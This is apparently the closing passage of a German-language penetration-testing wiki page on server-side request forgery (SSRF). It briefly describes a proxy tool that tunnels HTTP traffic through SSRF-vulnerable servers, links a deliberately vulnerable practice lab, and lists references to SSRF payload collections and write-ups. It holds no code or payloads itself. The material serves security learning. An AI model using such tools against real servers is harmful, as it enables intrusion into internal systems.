SSRF Proxy ist ein mehrthreadiger HTTP-Proxy-Server, der dazu entwickelt wurde, Client-HTTP-Traffic durch HTTP-Server zu tunneln, die für Server-Side Request Forgery (SSRF) verwundbar sind.

### Zum Üben


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Referenzen

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
